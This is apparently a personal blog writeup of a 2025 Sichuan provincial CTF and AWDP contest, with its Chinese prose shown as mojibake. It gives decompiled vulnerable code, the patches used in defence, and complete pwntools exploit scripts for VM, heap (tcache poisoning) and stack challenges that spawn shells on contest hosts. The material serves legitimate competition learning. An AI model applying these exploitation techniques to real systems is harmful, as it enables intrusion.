export const layout = "#components/Page.js";
export const title = "2025 å¹´å››å·çœçœèµ› Writeup";
export const description = "2025 å¹´å››å·çœçœèµ› CTF ä¸ AWDP é¢˜è§£";
export const created = "2025-10-27";

# 2025 å¹´å››å·çœçœèµ› Writeup

> å“¦è€¶ ğŸ˜ æˆ‘ä»¬æ˜¯å† å†›ï¼

å››å·çœèµ›ä¸€èˆ¬éƒ½æ˜¯æ‰“ä¸¤å¤©ï¼Œçº¿ä¸‹æ–­ç½‘æ¯”èµ›ï¼Œç¬¬ä¸€å¤© CTF jp èµ›åˆ¶ï¼Œç¬¬äºŒå¤©å°±æ˜¯ awdpï¼Œæœ€ç»ˆæŠŠä¸¤å¤©å½’ä¸€åŒ–å¾—åˆ†æ’åã€‚

è¿™ç¯‡åšå®¢ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹ awdp éƒ¨åˆ†ï¼Œå› ä¸ºå¹³å¸¸ awdp çº¿ä¸‹æ‰“çš„æœºä¼šä¸æ˜¯å¾ˆå¤šï¼Œæ¯æ¬¡èµ›å‰éƒ½ä¼šæ‰‹å¿™è„šä¹±åœ°æ•´ç†å¥½ä¹…ï¼Œæ„Ÿè§‰è¿˜æ˜¯å¾—å¥½å¥½è®°å½•ä¸€ä¸‹ã€‚å¦å¤–æ˜å¹´å‡å¦‚æœ‰å­¦å¼Ÿæ¥æ‰“çš„è¯ï¼Œæ„Ÿè§‰ä¹Ÿå¯ä»¥æ–¹ä¾¿ä»–ä»¬ã€‚

## Day1

~~ä½†æ˜¯ CTF èµ›åˆ¶ä¹Ÿæ˜¯è¦ç®€å•è®°å½•ä¸€ä¸‹çš„~~

ç¬¬ä¸€å¤©çš„ JP èµ›åˆ¶çš„ Pwn é¢˜çœŸæ˜¯çº¯ğŸ’©ï¼Œç»™æˆ‘æ¶å¿ƒåäº†ï¼Œæˆ‘ä¸€å…±è§£å‡ºäº†ä¸¤é“ Pwn é¢˜åŠ ä¸€é“é€†å‘é¢˜ã€‚

### Pwn

#### wannaop

VM Pwnï¼Œæˆ‘åŸºæœ¬ä¸Šé€ä¸ªå‡½æ•°è¿˜åŸäº†ï¼š

```c
__int64 __fastcall solve(__int64 vm, unsigned int op1, unsigned int op2)
{
  __int64 result; // rax
  int v4; // [rsp+20h] [rbp-8h]
  int v5; // [rsp+20h] [rbp-8h]
  unsigned int v6; // [rsp+20h] [rbp-8h]
  int v7; // [rsp+24h] [rbp-4h]
  int v8; // [rsp+24h] [rbp-4h]
  int v9; // [rsp+24h] [rbp-4h]

  result = op1;
  switch ( op1 )
  {
    case 0u:
      push(vm, op2);
      return 1;
    case 1u:
      pop(vm);
      return 1;
    case 2u:
      v4 = pop(vm);
      v7 = pop(vm);
      push(vm, (unsigned int)(v7 + v4));
      return 1;
    case 3u:
      v5 = pop(vm);
      v8 = pop(vm);
      push(vm, (unsigned int)(v5 - v8));
      return 1;
    case 4u:
      v6 = pop(vm);
      v9 = pop(vm);
      push(vm, v9 ^ v6);
      return 1;
    case 5u:
      return result;
    case 6u:
      store(vm, op2);
      return 1;
    case 7u:
      return 0;
    default:
      puts("err opcode!");
      return 1;
  }
}

__int64 __fastcall pop(vm *a1)
{
  int sp; // eax

  if ( a1->sp < 0 )
  {
    puts("error!");
    return 0;
  }
  else
  {
    sp = a1->sp;
    a1->sp = sp - 1;
    return *(unsigned int *)&a1->stack[4 * sp];
  }
}

int __fastcall push(vm *a1, int a2)
{
  int result; // eax

  if ( a1->sp > 343 )
    return puts("error!");
  ++a1->sp;
  result = (int)a1;
  *(_DWORD *)&a1->stack[4 * a1->sp] = a2;       // stack overflow
  return result;
}
```

å…¶å®ä¸€å¼€å§‹æ¯”è¾ƒå¥½æƒ³åˆ°çš„æ˜¯ `push` æ“ä½œå¯ä»¥æº¢å‡ºï¼Œæ­£æ•°æº¢å‡ºç”šè‡³å¯ä»¥æ”¹åˆ° `sp` æŒ‡é’ˆï¼Œç„¶åæŠŠ `sp` æ”¹åˆ°è´Ÿæ•°ï¼Œå°±å¯ä»¥æ§åˆ¶æ‰§è¡Œæµï¼Œå½“ç„¶ç›´æ¥æ­£å‘æº¢å‡ºä¹Ÿå¯ä»¥ã€‚

ä½†æ˜¯æ¯”è¾ƒè›‹ç–¼çš„æ˜¯é¢˜ç›®æä¾›çš„æ“ä½œçœ‹åæ±‡ç¼–ï¼Œä¼šæ„Ÿè§‰é¢˜ç›®æ²¡ç»™ä»»ä½•çš„ leak æ“ä½œï¼Œbut ä½ ä¼šå‘ç°ç¨‹åºçš„ bss æ®µä¸Šæœ‰ä¸ª `%d`ï¼Œäº¤å‰å¼•ç”¨ä¸€ä¸‹å‘ç°åŠŸèƒ½ 5 é‡Œè—äº†ä¸€ä¸ª `printf`ï¼Œå¯ä»¥ç”¨æ¥æ³„éœ²ã€‚ã€‚ã€‚

```
.text:00000000000015C4 loc_15C4:                               ; CODE XREF: solve+41â†‘j
.text:00000000000015C4                                         ; DATA XREF: .rodata:jpt_14F2â†“o
.text:00000000000015C4                 call    $+5             ; jumptable 00000000000014F2 case 5
.text:00000000000015C9                 lea     r8, loc_15D5
.text:00000000000015D0                 mov     [rsp+28h+var_28], r8
.text:00000000000015D4                 retn
.text:00000000000015D5 ; ---------------------------------------------------------------------------
.text:00000000000015D5
.text:00000000000015D5 loc_15D5:                               ; DATA XREF: solve+118â†‘o
.text:00000000000015D5                 cmp     [rbp+var_20], 0FFh
.text:00000000000015DC                 jg      short loc_162F
.text:00000000000015DE                 mov     rdx, [rbp+var_18]
.text:00000000000015E2                 mov     eax, [rbp+var_20]
.text:00000000000015E5                 cdqe
.text:00000000000015E7                 movzx   eax, byte ptr [rdx+rax+404h]
.text:00000000000015EF                 movzx   eax, al
.text:00000000000015F2                 mov     esi, eax
.text:00000000000015F4                 lea     rdi, aD         ; "%d\n"
.text:00000000000015FB                 mov     eax, 0
.text:0000000000001600                 call    _printf
```

emm æ„Ÿè§‰æœ‰ç‚¹é€†å¤©äº†ï¼Œé‚£å°±å¾ˆç®€å•äº†ï¼Œæ³„æ¼åœ°å€ç„¶ååˆ©ç”¨é¢˜ç›®ç»™çš„ä»»æ„å†™åŸè¯­å’Œæ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œæ³¨æ„å¦‚æœç›´æ¥å†™ orw é•¿åº¦ä¼šçˆ†ï¼Œæ‰€ä»¥å…ˆ rereadï¼Œæ‡’å¾—æ ˆè¿ç§»äº†ã€‚

```python
from pwn import *
from sys import argv

proc = "./wannaop"
context.log_level = "debug"
context.binary = proc
elf = ELF(proc, checksec=False)
io = remote("173.33.5.48", 9999) if argv[1] == 'r' else process(proc)
libc = ELF("./libc.so.6")
if args.G:
    gdb.attach(io)


def choose(idx):
    io.sendlineafter(b"wanna op: ", str(idx).encode())


def push(op):
    choose(0)
    if op == "-":
        io.sendline(b"-")
    else:
        io.sendline(str(op).encode())


def pop(op):
    choose(1)
    io.sendline(str(op).encode())


def add():
    choose(2)
    io.sendline(b"0")


def sub():
    choose(3)
    io.sendline(b"0")


def xor():
    choose(4)
    io.sendline(b"0")


def store(op):
    choose(6)
    io.sendline(str(op).encode())


def ret():
    choose(7)
    io.sendline(b"0")


def leak(op):
    choose(5)
    io.sendline(str(op).encode())
    b = io.recvuntil(b"\n", drop=True).decode()
    return int(b, 10)


def write64(addr):
    push(addr & 0xffffffff)
    push((addr >> 32) & 0xffffffff)

# vm: 0x7fffffffcb10
# sp: 0x7fffffffd0e0


res = b""
for i in range(8):
    res += p8(leak(-0x41c + i))
pie_addr = u64(res) - 0x1734
log.info(f"pie_addr => {hex(pie_addr)}")
res = b""
for i in range(8):
    res += p8(leak(-0x41c + i - 8))
stack_addr = u64(res)
log.info(f"stack_addr => {hex(stack_addr)}")

pop_rdi_ret = pie_addr + 0x00000000000017c3
pop_rsi_ret = pie_addr + 0x00000000000017c1
target_addr = stack_addr - 0x608
puts_addr = pie_addr + 0x10f0
main_addr = pie_addr + 0x1692
for i in range(256):
    push(0)

push(0x145)
write64(pop_rdi_ret)
write64(target_addr)
write64(puts_addr)
write64(main_addr)

ret()

libc_addr = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) - 0x63162
log.info(f"libc_addr => {hex(libc_addr)}")

pop_rsi_ret = libc_addr + 0x000000000002601f
pop_rdx_ret = libc_addr + 0x000000000015fae6
pop_rax_ret = libc_addr + 0x0000000000036174
syscall = libc_addr + 0x00000000000630a9
libc.address = libc_addr
pop_rax_rdx_rbx_ret = libc_addr + 0x000000000015fae5
for i in range(254):
    push(0)

push(0x616c662f)
push(0x67)
push(0x145)

reread = [pop_rdi_ret, 0, pop_rsi_ret, stack_addr + 0x70, pop_rax_rdx_rbx_ret, 0, 0x300, 0, syscall]
orw = [pop_rdi_ret, -100, pop_rsi_ret, stack_addr - 0xf8, pop_rdx_ret, 0, 0, pop_rax_ret, 257, syscall]
orw += [pop_rdi_ret, 3, pop_rsi_ret, stack_addr + 0x400, pop_rdx_ret, 0x100, 0, pop_rax_ret, 0, syscall]
orw += [pop_rdi_ret, 1, pop_rsi_ret, stack_addr + 0x400, pop_rdx_ret, 0x100, 0, pop_rax_ret, 1, syscall]
orw = flat(orw)
# print(res)

for i in reread:
    write64(i)
ret()
print(hex(stack_addr))
io.sendline(orw)
io.interactive()
```

æ¯”èµ›çš„æ—¶å€™å‘ç°ä¸å°‘äººéƒ½å¡åœ¨æ‰¾åˆ° leak è¿™ä¸€æ­¥ï¼Œå¦å¤–æˆ‘æ‰“è¿œç¨‹çš„æ—¶å€™å¿˜äº†å…³ä»£ç†å¯¼è‡´è°ƒäº†åŠå¤©ä»¥ä¸ºæ˜¯ exp é—®é¢˜ï¼Œç»™è¯»è€…æä¸ªé†’ï¼Œçº¿ä¸‹æ‰“æ¯”èµ›åŠ¡å¿…å…³ä»£ç†ï¼Œå“ªæ€•å¹³å°èƒ½æ­£å¸¸è®¿é—®ï¼Œä¹Ÿæœ‰å¯èƒ½æŸä¸ªé¶æœºä¸èƒ½è®¿é—®æ‘†ä½ ä¸€é“ã€‚

#### ezvm

ä¾ç„¶æ˜¯ vm é¢˜ï¼Œï¼Œå¾ˆé€†å¤©ã€‚æ¯”è¾ƒå€’éœ‰çš„æ˜¯æˆ‘è¿™ä¸ªé¢˜å¿˜äº†å­˜ i64 äº†ï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸ä»”ç»†åˆ†æäº†ã€‚

å¤§æ¦‚å°±æ˜¯é¢˜ç›®ç›´æ¥ç»™äººä»»æ„è¯»å’Œä»»æ„å†™çš„åŸè¯­ `load` å’Œ `store`ï¼Œä½†æ˜¯å®ƒä»¬éƒ½æœ‰ä¸€ä¸ªå…³äºæœ€é«˜ç¬¦å·ä½çš„ checkï¼Œè€Œè¿™ä¸ªç¬¦å·ä½æ˜¯åœ¨ load ç«‹å³æ•°æ—¶è®¾ç½®çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæƒ³å®ç°ä»»æ„åœ°å€è¯»å†™åŸè¯­ï¼Œå¾—å…ˆè§£å†³è¿™ä¸ªç¬¦å·ä½çš„é—®é¢˜ã€‚ä»”ç»†åˆ†æä¸€ä¼šå¯ä»¥å‘ç°ï¼Œalu æ“ä½œæ—é‡Œçš„ `mul` å’Œ `div` æ“ä½œå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ç„¶åå°±æ˜¯å®ç°è¿™ä¸ªåŸè¯­ï¼ŒæŠŠ `puts@got` æ”¹æˆ ogg ç»“æŸã€‚

```python
from pwn import *
from sys import argv

proc = "./easyvm"
context.log_level = "debug"
context.binary = proc
elf = ELF(proc, checksec=False)
io = remote("173.33.5.3", 9999) if argv[1] == 'r' else process(proc)
libc = ELF("./libc.so.6")

if args.G:
    gdb.attach(io, """
    b *0x4022F3
    """)


def pack(op, reg1, reg2):
    return p8(op) + p8(reg1) + b"\x00" * 2 + p64(reg2)


def push(reg):
    return pack(1, 0, reg & 0xff)


def pop(reg):
    return pack(2, reg & 0xff, 0)


def mv_reg(reg1, reg2):
    return pack(3, reg1 & 0xff, reg2 & 0xff)


def load_reg(reg1, reg2):
    return pack(4, reg1 & 0xff, reg2)


def add(reg1, reg2):
    return pack(5, reg1 & 0xff, reg2 & 0xff)


def mul(reg1, reg2):
    return pack(7, reg1 & 0xff, reg2 & 0xff)


def div(reg1, reg2):
    return pack(8, reg1 & 0xff, reg2 & 0xff)


def load(reg1, reg2):
    return pack(12, reg1 & 0xff, reg2 & 0xff)


def store(reg2, reg1):
    return pack(13, reg1 & 0xff, reg2 & 0xff)


def readimm(target, zero_reg):
    res = load_reg(1, target)
    res += div(zero_reg, zero_reg)
    res += mul(zero_reg, 1)
    return res


def read64(target, zero_reg):
    res = readimm(target, zero_reg)
    res += load(zero_reg, 1)
    return res

# def write32()
# code: 0x4062d0 0x1800
# mem: 0x407ae0 0x40
# stack: 0x407b30 0x900
# vm: 0x406290 0x20
payload = b""
payload += readimm(0x405028, 0)
payload += load(3, 0)
payload += readimm(0x7ffff7c00000 + 0xebd43 - 0x7ffff7c80e50, 2)
payload += add(3, 2)
payload += store(0, 3)

io.sendlineafter(b"code:\n\t", payload)

io.interactive()
```

æˆ‘åˆçŠ¯ç—…äº†ï¼Œä¸€å¼€å§‹æ‹¿åˆ°ä»»æ„å†™åŸè¯­ä¹‹åï¼Œè¯•äº†ä¸€ä¸ª oggï¼Œå‘ç°æ‰“ä¸é€šï¼Œå°±ä»¥ä¸ºæ ˆæœ‰é—®é¢˜æ‰“ä¸äº† oggï¼Œç„¶åå»æ‰“ io äº†ï¼Œåæ¥å‘ç°ç¬¬ä¸€é“é¢˜åšçš„æ¯”æˆ‘æ…¢çš„è¿™é“é¢˜å±…ç„¶ä¸€è¡€äº†æ‰ååº”è¿‡æ¥ã€‚ã€‚ã€‚åº”è¯¥å…¨å°è¯•ä¸€éã€‚

#### hardllvm

æœ¬åœºæœ€ sb çš„é¢˜ç›®äº†ï¼Œçº¿ä¸‹æ–­ç½‘æ²¡ç¯å¢ƒï¼Œå°±å—¯çœ‹ã€‚

åŸºæœ¬ä¸Šéƒ½é€†å‡ºæ¥äº†ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€ç‚¹ç»“æ„æ²¡ææ¸…æ¥šï¼Œå¯¼è‡´æ ¹æœ¬è·‘ä¸äº†ã€‚

hard åœ¨å“ª

æ€»ç»“ï¼šé—¹éº»äº†ï¼Œç¬¬ä¸€å¤©è¿™ä¸‰é“é¢˜è¦æ˜¯ä¸æ–­ç½‘è®© ai åšæ„Ÿè§‰ç”¨ä¸äº†ä¸€ä¸ªå°æ—¶ï¼Œï¼Œï¼Œå¥½å¥‡ç°åœ¨ ctf å‡º vm pwn çš„éƒ½æ˜¯ä»€ä¹ˆå¿ƒç†ï¼Œå°¤å…¶æ˜¯è¿™ç§æ¯«æ— åˆ©ç”¨éš¾åº¦çš„ã€‚ã€‚ã€‚

### Reverse

åˆ«é—®æˆ‘ä¸ºä»€ä¹ˆä¼šåšé€†å‘ï¼Œå¤ªç™½ç»™äº†ã€‚

é¢˜ç›®å®ç°äº†ä¸€ä¸ª ida çš„åè°ƒï¼Œä½†æ˜¯ gdb å¯ä»¥æ­£å¸¸è°ƒã€‚è€Œé¢˜ç›®çš„æœ¬ä½“é€»è¾‘åˆå¾ˆç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªå¼‚æˆ–åŠ å¯†ã€‚

è¾¹åƒé¥­å°±ç§’äº†ã€‚

## Day2

### awdp-fix

å››é“é¢˜ç›®ï¼Œç¬¬ä¸€é“é¢˜æ˜¯ä¸ªå †é¢˜ï¼Œç¬¬ä¸€è½®ä¸Šæ¥è‚¯å®šæ˜¯å…ˆ nop freeï¼Œäº¤äº†ä¸€å‘ä½†æ˜¯å¯„äº†

```c
int delete()
{
  char vars0; // [rsp+0h] [rbp+0h] BYREF
  void *ptr; // [rsp+8h] [rbp+8h]
  int vars10; // [rsp+10h] [rbp+10h]
  unsigned __int64 vars18; // [rsp+18h] [rbp+18h]

  vars18 = __readfsqword(0x28u);
  __printf_chk(1, "Index: ");
  read(0, &vars0, 0xFu);
  if ( (unsigned int)strtol(&vars0, 0, 10) > 0x20 )
    return puts("Invalid index!");
  if ( !ptr )
    return puts("Chunk not allocated!");
  if ( vars10 )
    return puts("Chunk already freed!");
  free(ptr);
  vars10 = 0;  // [1]
  return puts("Chunk freed!");
}
```

[1] å¤„è£…æ¨¡ä½œæ ·æ¸…ç©ºäº†æŒ‡é’ˆï¼Œä½†å…¶å®ä»”ç»†çœ‹ä¸€ä¸‹æ ¹æœ¬æ²¡æœ‰ï¼Œä¿®æˆæŠŠæŒ‡é’ˆç½®ä¸º 0 å°±å¯ä»¥äº†ã€‚

ç¬¬äºŒé“é¢˜æ˜¯ä¸ªä¸€ä¸ªæ ˆæº¢å‡ºï¼š

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[48]; // [rsp+0h] [rbp-30h] BYREF

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  alarm(0x78u);
  read(0, buf, 64u);  // [2]
  gorun();
  return 0;
}
```

[2] å¤„æœ‰ä¸€ä¸ªå¾ˆæ˜¾ç„¶çš„æ ˆæº¢å‡ºï¼Œç›´æ¥ä¿®å¤å°±å¯ä»¥äº†ï¼Œæˆ‘å¼€èµ›äº”åˆ†é’Ÿå°±æŠŠè¿™ä¸ªäº¤äº†ï¼Œä¸ºä»€ä¹ˆæ˜¯äº”åˆ†é’Ÿå‘¢ï¼Œå› ä¸ºå‰ 4 åˆ†é’Ÿå» nop free äº†å“ˆå“ˆã€‚

ç¬¬ä¸‰é“é¢˜æ˜¯ä¸€ä¸ª crypto pwnï¼š

```c
int sub_401720()
{
  char src[256]; // [rsp+0h] [rbp-250h] BYREF
  char s[256]; // [rsp+100h] [rbp-150h] BYREF
  _BYTE dest[76]; // [rsp+200h] [rbp-50h] BYREF
  int v4; // [rsp+24Ch] [rbp-4h]

  printf("Enter Base64 encoded data: ");
  fgets(s, 256, stdin);
  s[strcspn(s, "\n")] = 0;
  v4 = sub_40153B((__int64)s, (__int64)src);  // [3]
  if ( v4 > 64 )
    return printf("Invalid size");
  memcpy(dest, src, v4);  // [4]
  return puts("have a good time!");
}

int sub_4016FD()
{
  puts("Congratulations! You got the shell!");
  return system("/bin/sh");  // [5]
}
```

æŒ‰ç†è¯´è¿™é‡Œè‚¯å®šæ˜¯ `v4` æœ‰é—®é¢˜å¯¼è‡´ `memcpy` æº¢å‡ºï¼Œæˆ‘ä¸€å¼€å§‹ç›´æ¥ patch äº† v4 ä¸º 0x40ï¼Œä½†æ˜¯è¿‡ä¸äº†ã€‚

ç¨å¾®ç¿»äº†ä¸€ä¸‹å‡½æ•°è¡¨å‘ç°æœ‰ä¸ª backdoorï¼Œäºæ˜¯æŠŠ `system` patch äº†ï¼Œç„¶è€Œæ²¡æœ‰åµç”¨ï¼Œæœ‰ç‚¹æ‡µäº†ï¼Œå‘ç° `system` çš„å‚æ•°æ˜¯ `"/bin/sh"`ï¼Œäºæ˜¯æŠŠ `"/bin/sh"` patch äº†ï¼Œç„¶åå°±è¿‡äº†ã€‚

åé¢ break çš„æ—¶å€™åçŸ¥åè§‰ï¼Œ`sub_40153B` è¿™ä¸ªå‡½æ•°å¯ä»¥è¿”å›è´Ÿæ•°ï¼Œé‚£å°±ç›¸å½“äºæ•´æ•°æº¢å‡ºäº†ã€‚

æœ€åä¸€ä¸ªé¢˜æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼š

```c
__int64 __fastcall sub_2567(const char *a1, const char *a2)
{
  if ( !strcmp(a1, a2) )  // [6]
  {
    puts("Captcha correct!");
    printf("Welcome:");
    read(0, buf, 0x10u);
    printf("Your greeting:");
    puts(buf);
  }
  else
  {
    puts("Captcha wrong!");
  }
  putchar(10);
  return 0;
}
```

é¢˜ç›® got è¡¨å¯å†™ï¼Œåº”è¯¥æ˜¯æœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥å®ç°ä»»æ„å†™æŠŠ `puts` æ”¹æˆ `printf`ï¼Œä½†æ˜¯æˆ‘æ¯”èµ›æ—¶å¤ªæ€¥äº†ï¼Œæ²¡çœ‹åˆ°æ€ä¹ˆå®ç°çš„ï¼Œæ‰€ä»¥å°±ç›´æ¥æŠŠ [6] çš„ `jnz` patch æˆ `jz` äº†ï¼Œä¸€éè¿‡ï¼Œç¬‘æ­»äº†ã€‚


åˆ°è¿™åŸºæœ¬ä¸Šä¸åˆ° 2h å°± fix ç»“æŸäº†ï¼Œç¾ç¾åƒåˆ†ã€‚

ç„¶åå¼€å§‹ attack

### awdp-attack

ä¸Šæ¥å…ˆçœ‹çš„å †é¢˜ï¼Œç™½ç»™çš„ double freeï¼Œä½†æ˜¯æ²¡æœ‰ editï¼Œåªè¦æä¸€ä¸ª uaf è½¬ chunk overlap å°±å¯ä»¥æ‰“ tcache posioning äº†ï¼Œç¨å¾®çœ‹äº†ä¸‹ç¬”è®°ï¼Œhouse of botcake + å †é£æ°´æ¯”è¾ƒé€‚åˆï¼Œç…§ç€ç¬”è®°é‡Œçš„æ¿å­æ‰“äº†ã€‚

å®ç°äº†ä¸€ä¸ª 0x250 çš„ chunk victimB å’Œ 4 ä¸ª 0x80 çš„ chunk é‡å çš„æ•ˆæœï¼Œç„¶åæ‰“ tcache posioning é€šè¿‡ environ æ‰“æ ˆå°±ç»“æŸäº†ã€‚

ä¸€è¡€ï¼Œæ¯”èµ›ç»“æŸæ—¶è¿™ä¸ªé¢˜åƒäº† 1700 åˆ†+ï¼Œå¤ªçˆ½äº†ã€‚

```python
from pwn import *
from sys import argv

proc = "./heap"
context.log_level = "debug"
context.binary = proc
elf = ELF(proc, checksec=False)
io = remote("173.33.5.38", 9999) if argv[1] == 'r' else process(proc)
libc = ELF("./libc.so.6")

if args.G:
    gdb.attach(io)


def choose(idx):
    io.sendlineafter(b"> ", str(idx).encode())


def create(idx, size, content):
    choose(1)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendlineafter(b"Data: ", content)


def show(idx):
    choose(2)
    io.sendlineafter(b"Index: ", str(idx).encode())


def delete(idx):
    choose(3)
    io.sendlineafter(b"Index: ", str(idx).encode())


for i in range(7):
    create(i, 0x80, b"aaaa")
create(7, 0x80, b"victim1")
create(8, 0x80, b"victim2")
create(20, 0x80, b"gap")
create(21, 0x80, b"gap")
create(22, 0x80, b"gap")
create(23, 0x80, b"gap")
create(24, 0x20, b"gap")

for i in range(9):
    delete(i)
show(0)
io.recvuntil(b"Data: ")
heap_base = u64(io.recv(5).ljust(8, b"\x00")) << 12
log.info(f"heap_base => {hex(heap_base)}")
io.recv(3)
cookie = u64(io.recv(8))
log.info(f"cookie => {hex(cookie)}")

show(7)
io.recvuntil(b"Data: ")
libc_addr = u64(io.recv(8)) - 0x21ace0
log.info(f"libc_addr => {hex(libc_addr)}")

# house of botcake çš„å¤±è´¥å°è¯•ï¼Œæ²¡æœ‰ edit åšäº†ç›¸åŒå¤§å°çš„å †å—é‡å ä¹Ÿæ²¡ç”¨
# create(9, 0x80, b"gap")
# delete(8)
# create(10, 0x30, b"gap0")
# create(11, 0x40, b"gap1")
# create(12, 0x30, b"gap2")
# create(13, 0x40, b"gap3")

environ = libc_addr + 0x222200
create(18, 0x80, b"a")
create(19, 0x80, b"a")
create(9, 0x100, b"A" * 0x88 + p64(0x250))
delete(8)
delete(20)
create(10, 0x240, b"A" * 0x88 + p64(0x90) + p64(environ - 0x10 ^ (heap_base >> 12)) + p64(cookie))
create(11, 0x80, b"")
create(12, 0x80, b"")
show(12)
io.recvuntil(b": ")
io.recv(16)
stack_addr = u64(io.recv(8))
log.info(f"stack_addr => {hex(stack_addr)}")

delete(20)
delete(10)
create(13, 0x240, b"A" * 0x88 + p64(0x90) + p64(stack_addr - 0x168 ^ (heap_base >> 12)) + p64(cookie))
create(14, 0x80, b"")
# pause()

pop_rdi_ret = libc_addr + 0x000000000002a3e5
ret = libc_addr + 0x00000000000f4119
system = libc.sym["system"] + libc_addr
binsh = libc_addr + next(libc.search(b"/bin/sh\x00"))
payload = flat([pop_rdi_ret, binsh, ret, system])
create(15, 0x80, b"aaaabbbb" + payload)

io.interactive()
```

ç„¶åå°±å»çœ‹é‚£ä¸ª crypto pwn äº†ï¼Œéš¾ç‚¹ä¸»è¦åœ¨ä¸¤ä¸ªåŠ å¯†ç®—æ³•çš„å¤ç°ä¸Šï¼Œæ‰¾é˜Ÿé‡Œçš„ crypto å¸ˆå‚…å¤ç°äº†ä¸€ä¸‹ã€‚

å¤ç°çš„æœ‰ç‚¹è´¹åŠ²ï¼Œé€†å‘çš„ä¹Ÿæœ‰ç‚¹è´¹åŠ²ï¼Œä½†æ˜¯è¿˜æ˜¯æˆåŠŸäº†qwq

å¦‚ fix æ‰€è¯´é¢˜ç›®æœ‰ backdoorï¼Œæ§åˆ¶æ‰§è¡Œæµå°±è¡Œã€‚

```python
from pwn import *
from sys import argv
import base64
from Crypto.Util.number import long_to_bytes

proc = "./challenge"
context.log_level = "debug"
context.binary = proc
elf = ELF(proc, checksec=False)
io = remote("173.33.5.40", 9999) if argv[1] == 'r' else process(proc)

if args.G:
    gdb.attach(io)

s='abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ'
# h=process("/home/l0fxxs/ctf/game/shemsai/mycode/challenge")
def decode(input):
    n0=s.find(input[0])
    n1=s.find(input[1])
    n2=s.find(input[2])
    n3=s.find(input[3])
    print(n0,n1,n2,n3)
    v3_0_6=n3
    v3_6_8=n2%(2**2)
    v3=v3_0_6+(v3_6_8<<6)
    v2_0_4=n2>>2
    v2_4_8=n1%(2**4)
    v2=v2_0_4+(v2_4_8<<4)
    v1_0_2=n1>>4
    v1_2_8=n0
    v1=v1_0_2+(v1_2_8<<2)
    print(v1,v2,v3)
    return long_to_bytes((v1<<16)+(v2<<8)+v3)

def decode1(b):
    # ret=[]
    ret = ""
    for i in range(len(b)//3):
        a1=(b[3*i])
        a2=(b[3*i+1])
        a3=(b[3*i+2])
        print(a1,a2,a3)
        v3=a3&0b111111
        v2=((a3>>6)+(((a2&0b111111))<<2))&0b111111

        v1=((a2>>4)+((a1&3)<<4))&0b111111
        v0=(a1>>2)&0b111111
        ret+= s[v0] + s[v1] + s[v2] + s[v3]
        print((ret).encode())
    return (ret).encode()

io.recvuntil(b": ")
res = decode(io.recvuntil(b"\n", drop=True).decode())
io.sendlineafter(b"> ", res)

backdoor = 0x401711
payload = b"qAqAbbbb" + decode1((b"\x00" + p64(backdoor)) * 32)
io.sendline(payload)
io.interactive()
```

ä¸Šé¢è¿™ä¸ªé¢˜è´¹å¤ªä¹…æ—¶é—´äº†ï¼Œè¿™ç§æ”¿æ²»æ¯”èµ›æ—¶é—´æœ¬æ¥å°±çŸ­ï¼Œåšåˆ°è¿™ä¸ª noleak æ ˆæº¢å‡ºæ—¶æ—¶é—´å·²ç»ä¸å¤ªå¤Ÿäº†ã€‚

äºæ˜¯æˆåŠŸçŠ¯ç—…äº†ï¼Œå…·ä½“æƒ…å†µæ˜¯ï¼Œç”¨ ROPgadget èƒ½çœ‹åˆ°ä¸‹é¢è¿™ä¸¤æ¡ gadgetï¼š

```
0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret  // [7]
0x000000000040121c : pop rbx ; ret
```

å¾ˆç»å…¸çš„ magic gadget äº†ï¼Œç›¸å½“äºç»™äº†ä»»æ„åœ°å€åŠ çš„åŸè¯­ï¼Œbut æˆ‘æ¯”èµ›æ—¶åªæƒ³èµ·æ¥ç”¨ ropper äº†ï¼Œè€Œ ropper æ‰¾ä¸åˆ° [7] è¿™æ¡é“¾å­ã€‚ã€‚ã€‚ã€‚

ç„¶åæˆ‘å°±åªèƒ½çº¯é£æ°´æ‰“ï¼Œï¼Œç©¶ææŠ˜ç£¨ã€‚

~~é¢„æœŸçš„è¯åº”è¯¥æ˜¯ï¼Œå…ˆæ ˆè¿ç§»åˆ° bss ä¸Šï¼Œç„¶å `call _start` åœ¨ bss ä¸Šå¸ƒç½® libcï¼Œé€šè¿‡ä»»æ„åŠ åŸè¯­æä¸€ä¸ª ogg å‡ºæ¥æ‹¿ä¸‹ã€‚~~

å¤ç°äº†ä¸€ä¸‹å‘ç°å‹æ ¹æ²¡å¿…è¦ `call _start`ï¼Œç›´æ¥ç”¨ bss ä¸Š `stdin` å°±èƒ½æå‡ºæ¥ä¸€ä¸ª oggã€‚

å“å“ï¼Œæˆ‘ä¸æ˜¯äººã€‚

äºæ˜¯æœ€åä¸€é“æ ¼å¼åŒ–ä¸²æ—¶é—´å½»åº•ä¸å¤Ÿäº†ï¼Œé€šè¿‡æ•°ç»„è¶Šç•Œå¯ä»¥å®ç°åŠ«æŒ gotï¼Œç„¶åæŠŠ `puts` åŠ«æŒæˆ `printf`ï¼Œè½¬æˆå †ä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæœ‰ä¸‰æ¬¡ï¼Œå¯ä»¥æ“ä½œå‡ºæ— é™æ¬¡ï¼Œç„¶åæ²¡æ—¶é—´äº†ã€‚ã€‚


**æ€»ç»“**ï¼šäº”ä¸ªå°æ—¶çš„æ¯”èµ›ï¼Œåˆè¦æ‰“åˆè¦é˜²ï¼Œå…¶å®å¦‚æœä¸åœ¨æ ˆä¸Š stuck å®Œå…¨èƒ½å‡ºã€‚


## ç»éªŒ

